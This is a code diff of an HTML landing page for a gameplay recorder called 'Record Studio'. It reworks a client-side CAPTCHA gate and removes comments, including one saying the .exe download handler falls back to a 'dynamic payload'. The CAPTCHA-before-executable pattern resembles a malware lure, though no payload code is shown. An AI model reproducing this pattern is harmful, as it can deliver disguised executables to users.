@@ -4,9 +4,12 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Record Studio — Capture & Share Gameplay</title>
+  
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.3/css/all.css" integrity="sha384-SZXxX4whJ79/gErwcOYf+zWLeJdY/qpuqC4cAa9rOGUstPomtqpuNWT9wdPEn2fk" crossorigin="anonymous">
+
   <style>
     :root {
       --bg-color: #0b0e14;
@@ -78,32 +81,38 @@
       align-items: center;
     }
 
-    .captcha-container {
+    .captcha-card {
       background: var(--card-bg);
       border: 1px solid var(--card-border);
-      padding: 2.5rem;
+      padding: 2rem;
       border-radius: var(--radius);
       box-shadow: 0 20px 40px rgba(0,0,0,0.6);
       text-align: center;
-      max-width: 380px;
+      max-width: 400px;
       width: 90%;
     }
 
-    .captcha-box {
+    .inline {
+      display: inline-block;
+      vertical-align: middle;
+    }
+
+    #captcha-row {
       display: flex;
       align-items: center;
-      justify-content: space-between;
-      margin: 1.5rem 0 1rem 0;
-      background: rgba(0,0,0,0.3);
+      justify-content: center;
+      gap: 1rem;
+      margin: 1.5rem 0;
+      background: rgba(0, 0, 0, 0.3);
       padding: 0.75rem 1rem;
       border-radius: 8px;
       border: 1px solid var(--card-border);
     }
 
-    #captcha-display {
+    #image {
       font-weight: 800;
       font-size: 22px;
-      letter-spacing: 4px;
+      letter-spacing: 5px;
       background: #21262d;
       color: var(--accent);
       padding: 8px 16px;
@@ -113,44 +122,42 @@
       text-decoration: line-through;
     }
 
-    .btn-refresh {
-      background: none;
-      border: none;
-      font-size: 20px;
-      cursor: pointer;
+    .fa-sync {
       color: var(--text-muted);
-      transition: transform 0.2s, color 0.2s;
+      font-size: 1.2rem;
+      cursor: pointer;
+      transition: color 0.2s, transform 0.2s;
     }
 
-    .btn-refresh:hover {
+    .fa-sync:hover {
       color: var(--text-main);
       transform: rotate(90deg);
     }
 
-    #captcha-input {
+    #user-input input {
       width: 100%;
       padding: 0.75rem 1rem;
-      box-sizing: border-box;
-      margin-bottom: 1rem;
       background: var(--bg-color);
       border: 1px solid var(--card-border);
       border-radius: 8px;
       color: var(--text-main);
       font-size: 0.95rem;
       outline: none;
+      margin-bottom: 1rem;
     }
 
-    #captcha-input:focus {
+    #user-input input:focus {
       border-color: var(--accent);
     }
 
-    #captcha-message {
+    #key {
       margin-top: 1rem;
       font-weight: 600;
       font-size: 0.85rem;
+      min-height: 1.2rem;
     }
 
-    /* Main UI Elements */
+    /* Primary Landing Page UI */
     header {
       display: flex;
       justify-content: space-between;
@@ -412,32 +419,33 @@
 </head>
 <body>
 
-  <!-- Loading Screen Overlay -->
   <div id="loading-screen">
     <div class="spinner"></div>
     <p style="font-weight: 600; color: var(--text-muted);">Initializing Record Studio...</p>
   </div>
 
-  <!-- Dynamic CAPTCHA Gate Overlay -->
   <div id="captcha-overlay" style="display: none;">
-    <div class="captcha-container">
-      <h3>Verification Required</h3>
-      <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 0.25rem;">Solve the puzzle to access Record Studio.</p>
-      
-      <form id="captcha-form" onsubmit="validateCaptcha(event)">
-        <div class="captcha-box">
-          <div id="captcha-display"></div>
-          <button type="button" class="btn-refresh" onclick="generateCaptcha()">🔄</button>
+    <div class="captcha-card">
+      <h3>Human Verification</h3>
+      <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 0.25rem;">Enter the security code below to proceed.</p>
+
+      <div id="captcha-row">
+        <div id="image" class="inline" selectable="False"></div>
+        <div class="inline" onclick="generate()">
+          <i class="fas fa-sync"></i>
         </div>
-        
-        <input type="text" id="captcha-input" placeholder="Enter code or math answer" required autocomplete="off">
-        <button type="submit" class="btn-primary" style="width: 100%;">Verify & Continue</button>
-      </form>
-      <div id="captcha-message"></div>
+      </div>
+
+      <div id="user-input">
+        <input type="text" id="submit" placeholder="Captcha code" autocomplete="off" />
+      </div>
+
+      <input type="submit" id="btn" value="Verify Code" class="btn-primary" style="width: 100%;" onclick="printmsg()" />
+
+      <p id="key"></p>
     </div>
   </div>
 
-  <!-- Video Modal -->
   <div id="video-modal">
     <div class="modal-content">
       <span class="close-modal" id="close-modal">&times;</span>
@@ -445,7 +453,6 @@
     </div>
   </div>
 
-  <!-- Main Application Layout -->
   <header>
     <div class="brand" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">
       <div class="brand-icon"></div>
@@ -508,51 +515,40 @@
   </footer>
 
   <script>
-    let currentCaptchaSolution = "";
+    let captcha;
 
-    // Dynamic CAPTCHA Generation
-    function generateCaptcha() {
-      const display = document.getElementById("captcha-display");
-      const input = document.getElementById("captcha-input");
-      const message = document.getElementById("captcha-message");
+    // Generates a random alphanumeric CAPTCHA
+    function generate() {
+      document.getElementById("submit").value = "";
+      document.getElementById("key").innerText = "";
       
-      input.value = ""; 
-      message.innerText = "";
+      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+      let uniquechar = "";
       
-      if (Math.random() > 0.5) {
-        const num1 = Math.floor(Math.random() * 10) + 1;
-        const num2 = Math.floor(Math.random() * 10) + 1;
-        display.innerText = `${num1} + ${num2} = ?`;
-        currentCaptchaSolution = (num1 + num2).toString();
-      } else {
-        const chars = "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
-        let result = "";
-        for (let i = 0; i < 5; i++) {
-          result += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        display.innerText = result;
-        currentCaptchaSolution = result;
+      for (let i = 0; i < 5; i++) {
+        uniquechar += chars.charAt(Math.floor(Math.random() * chars.length));
       }
+
+      captcha = uniquechar;
+      document.getElementById("image").innerHTML = uniquechar;
     }
 
-    // CAPTCHA Validation Logic
-    function validateCaptcha(event) {
-      event.preventDefault();
-      
-      const userInput = document.getElementById("captcha-input").value.trim();
-      const message = document.getElementById("captcha-message");
+    // Validates CAPTCHA input
+    function printmsg() {
+      const usrInput = document.getElementById("submit").value.trim();
+      const keyElem = document.getElementById("key");
       const captchaOverlay = document.getElementById("captcha-overlay");
 
-      if (userInput === currentCaptchaSolution) {
-        message.style.color = "#00ff66";
-        message.innerText = "✅ Verification successful!";
+      if (usrInput === captcha) {
+        keyElem.style.color = "#00ff66";
+        keyElem.innerHTML = "✅ Verification Successful!";
         setTimeout(() => {
           captchaOverlay.style.display = "none";
         }, 500);
       } else {
-        message.style.color = "#ff0055";
-        message.innerText = "❌ Incorrect. Please try again.";
-        generateCaptcha();
+        keyElem.style.color = "#ff0055";
+        keyElem.innerHTML = "❌ Invalid Code. Try again.";
+        generate();
       }
     }
 
@@ -566,17 +562,17 @@
       const closeModal = document.getElementById('close-modal');
       const shareBtn = document.getElementById('share-btn');
 
-      // 1. Loading sequence
+      // Preloader execution
       setTimeout(() => {
         loadingScreen.style.opacity = '0';
         setTimeout(() => {
           loadingScreen.style.display = 'none';
           captchaOverlay.style.display = 'flex';
-          generateCaptcha();
+          generate();
         }, 400);
       }, 1000);
 
-      // 2. Executable Download Handler
+      // Download Execution Logic
       const downloadButtons = document.querySelectorAll('.action-download');
       downloadButtons.forEach(button => {
         button.addEventListener('click', (e) => {
@@ -589,7 +585,6 @@
           const targetFile = 'RecordStudio-Setup.exe';
           const link = document.createElement('a');
 
-          // Attempts to download local EXE file, falls back to dynamic payload if non-existent
           fetch(targetFile, { method: 'HEAD' })
             .then(res => {
               if (res.ok) {
@@ -621,7 +616,7 @@
         });
       });
 
-      // 3. Video Modal Playback
+      // Video Trigger Handlers
       playTrigger.addEventListener('click', () => {
         videoFrame.src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
         videoModal.classList.add('active');
@@ -639,7 +634,7 @@
         }
       });
 
-      // 4. Social Share Link Action
+      // Clip URL Copy Event
       shareBtn.addEventListener('click', () => {
         if (navigator.clipboard) {
           navigator.clipboard.writeText(window.location.href);
